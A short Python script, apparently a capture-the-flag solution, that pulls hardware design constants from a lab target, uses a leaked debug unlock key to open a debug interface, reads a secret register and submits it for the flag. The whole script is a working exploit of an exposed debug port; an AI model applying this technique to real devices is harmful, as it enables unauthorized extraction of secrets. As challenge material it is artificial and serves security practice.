```python
import re, requests

BASE = "http://target:8110"
v = requests.get(f"{BASE}/design").text

def ex(n): return int(re.search(rf"{n}\s*=\s*\d+'h([0-9a-fA-F]+)", v).group(1), 16)

requests.post(f"{BASE}/debug/write",
              json={"addr": f"{ex('DBG_UNLOCK_ADDR'):02X}",
                    "value": f"{ex('DBG_UNLOCK_KEY'):08X}"})
secret = requests.post(f"{BASE}/debug/read",
                        json={"addr": f"{ex('DBG_SECRET_ADDR'):02X}"}).json()["value"]
r = requests.post(f"{BASE}/flag", json={"secret": secret})
print(r.json()["flag"])
```
